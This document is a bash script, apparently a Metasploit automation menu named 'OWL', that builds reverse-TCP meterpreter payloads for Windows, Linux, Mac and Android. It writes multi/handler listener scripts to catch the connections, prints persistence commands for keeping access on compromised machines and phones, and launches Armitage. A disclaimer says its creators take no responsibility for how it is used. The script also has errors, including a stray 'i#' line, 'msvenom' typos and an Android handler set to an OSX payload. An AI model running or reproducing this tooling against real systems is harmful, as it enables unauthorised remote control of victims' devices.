#!/bin/bash
i# etc etc etc
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Documents/OWL_Files
clear
clear
echo -e "\E[97m===============\e[31mMetasploit service started \E[97m================="
echo -e "\E[97m \e[31mScripts and payloads saved to ~/Documents/OWL_Files/ "

echo -e "\E[31m^(0v0)^ \e[97m:Hello $USER3, I am Phil the owl. I moitor the script."
echo -e "\E[31m^(0v0)^ \e[97m:You will see me around while you hack. Say hi. I don't bite."

echo -e "\E[31m^(0v0)^ \e[97m:Me and the creator are in no way responsible for your actions."

read -p "Press [Enter] key to accept...."
clear
echo -e "\E[97m===============\e[31mMetasploit automation script \E[97m==============="
echo -e "\e[31m                

   ██████████████ █████   █████   █████ ████         
   ████      ████   ███    ███    ███   ████
   ████      ████   ███    ███    ███   ████
   ████      ████   ███    ███    ███   ████
   ████      ████   ███    ███    ███   ████
   ████      ████   ███    ███    ███   ████
   ████      ████   ███    ███    ███   ████ By binaryB4T 
   ████      ████   ███    ███    ███   ████ Version 1.0.0           
   ████      ████    ██    ███    ██    ████
   ██████████████    ███████████████    ███████████  
  
      "
tput sgr0                                       # 
echo -e "\e[97m[ \e[31m(0v0): Hello $USER, please select an option to begin. \e[97m]"
echo -e "\E[97m============================================================"
echo -e "\E[97m-\e[31m[1] \e[97mTrojan OWL       \e[31m [Create a payload with msvenom]  \E[97m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[97m-\e[31m[2] \e[97mWatch & Listen   \e[31m [Start a multi handler]   \E[1;33m"
tput sgr0
echo -e "\E[97m-\e[31m[3] \e[97mHunt(Exploit)       \e[31m [Drop into msfconsole]\E[1;33m"
tput sgr0
echo -e "\E[97m-\e[31m[4] \e[97mStakeout        \e[31m [Forge a Persistence script] \E[1;33m"
tput sgr0
echo -e "\E[97m-\e[31m[5] \e[97mArmitage       \e[31m [Launch Armitage GUI]  \E[1;33m"
tput sgr0                             # Reset attributes.
echo -e "\e[97m=== \e[31m^(0v0)^ \e[97m:Use this like an owl would - wisely \e[97m==========\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[97m== \e[31mTrojan OWL maker(Payload)\E[97m=="

PS3='Enter your choice 6=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Documents/OWL_Files/shell.exe
            echo -e "\E[97m===== \e[31mshell.exe saved to ~/Documents/OWL_Files\E[97m====="
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Documents/OWL_Files/shell.elf
            echo -e "\E[97m===== \e[31mshell.elf saved to ~/Documents/OWL_Files\E[97m====="
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Documents/OWL_Files/shell.macho
            echo -e "\E[97m===== \e[31mshell.macho saved to ~/Documents/OWL_Files\E[97m====="
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Documents/OWL_Files/shell.apk
            echo -e "\E[97m===== \e[31mshell.apk saved to ~/Documents/OWL_Files\E[97m====="
            ;;  
        "List_All")
            xterm -e msvenom -l &
            ;;   
        "Quit")
            echo "\E[31m^(0v0)^ /e[97m:See you later $USER" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[97m===== \e[31mWatch & Listen(Making a listener)\E[97m====="

PS3='Enter your choice 6=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            touch ~/Documents/OWL_Files/meterpreter.rc
            echo use exploit/multi/handler > ~/Documents/OWL_Files/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Documents/OWL_Files/meterpreter.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Documents/OWL_Files/meterpreter.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Documents/OWL_Files/meterpreter.rc
            echo set ExitOnSession false >> ~/Documents/OWL_Files/meterpreter.rc
            echo exploit -j -z >> ~/Documents/OWL_Files/meterpreter.rc
            cat ~/Documents/OWL_Files/meterpreter.rc
            xterm -e msfconsole -r ~/Documents/OWL_Files/meterpreter.rc &
            ;;
        "Linux")
            touch ~/Documents/OWL_Files/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/Documents/OWL_Files/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Documents/OWL_Files/meterpreter_linux.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Documents/OWL_Files/meterpreter_linux.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Documents/OWL_Files/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/Documents/OWL_Files/meterpreter_linux.rc
            echo exploit -j -z >> ~/Documents/OWL_Files/meterpreter_linux.rc
            cat ~/Documents/OWL_Files/meterpreter_linux.rc
            xterm -e msfconsole -r ~/Documents/OWL_Files/meterpreter_linux.rc &
            exit
            ;;
        "Mac")
            touch ~/Documents/OWL_Files/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/Documents/OWL_Files/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Documents/OWL_Files/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Documents/OWL_Files/meterpreter_mac.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Documents/OWL_Files/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/Documents/OWL_Files/meterpreter_mac.rc
            echo exploit -j -z >> ~/Documents/OWL_Files/meterpreter_mac.rc
            cat ~/Documents/OWL_Files/meterpreter_mac.rc
            xterm -e msfconsole -r ~/Documents/OWL_Files/meterpreter_mac.rc &
            ;;
        "Android")
            touch ~/Documents/OWL_Files/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/Documents/OWL_Files/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Documents/OWL_Files/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Documents/OWL_Files/meterpreter_droid.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Documents/OWL_Files/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/Documents/OWL_Files/meterpreter_droid.rc
            echo exploit -j -z >> ~/Documents/OWL_Files/meterpreter_droid.rc
            cat ~/Documents/OWL_Files/meterpreter_droid.rc
            xterm -e msfconsole -r ~/Documents/OWL_Files/meterpreter_droid.rc &
            ;;  
        "List_All")
            touch ~/Documents/OWL_Files/payloads.rc
            echo show payloads > ~/Documents/OWL_Files/payloads.rc
            cat ~/Documents/OWL_Files/payloads.rc
            xterm -e msfconsole -r ~/Documents/OWL_Files/payloads.rc &
            ;;   
        "Quit")
            echo "\E[31m^(0v0)^ /e[97m:See you later $USER" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

 "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "\E[97m===== \e[31mStarting Metasploit \E[97m====="
  msfconsole
  use exploit/multi/handler  

;;


  "4" | "4" )
  # 
  echo -e "\E[97m===== \e[31mStakeout time. Let's make a persistence script. \E[97m====="
 PS3='Enter your choice 5=QUIT: '
 options=("Windows" "Linux" "Mac" "Android" "Quit")
 select opt in "${options[@]}"
 do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            echo -e "\E[97m===== \e[31mrun persistence -U -X 30 -p $userport -r $uservar\E[97m====="
            ;;
        "Linux")
            echo -e "\E[97m===== \e[31mDo stuff.\E[97m====="
            ;;
        "Mac")
            echo 'Using directory /Applications/Utilities/'
            read -p 'Enter payload file name :example *shell.macho: ' uservar; 
            echo -e "\E[97m===== \e[31mdefaults write /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$uservar”;}’\E[97m====="
            ;;
        "Android")
            touch ~/Documents/OWL_Files/android.sh
            echo \#\!/bin/bash >> ~/Documents/OWL_Files/android.sh
            echo while : >> ~/Documents/OWL_Files/android.sh
            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/Documents/OWL_Files/android.sh
            echo sleep 20 >> ~/Documents/OWL_Files/android.sh
            echo done >> ~/Documents/OWL_Files/android.sh
            cat ~/Documents/OWL_Files/android.sh
            echo -e "\E[97m===== \e[31mandroid.sh saved to ~/Desktop/temp. Upload to / on device\E[97m=====" 
            ;;  
        "Quit")
            echo "\E[31m^(0v0)^ /e[97m:See you later $USER" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

  "5" | "5" )
  # 
  echo -e "\E[97m===== \e[31mArmitage Launcher \E[97m====="
  echo "armitage should be in /opt/armitage"
  echo -e "\E[97m::::: \e[31mLaunching...\E[97m:::::"
  xterm -e sudo java -jar /opt/armitage/armitage.jar & 

;;

esac

tput sgr0                               # Reset colors to "normal."

echo

exit 0


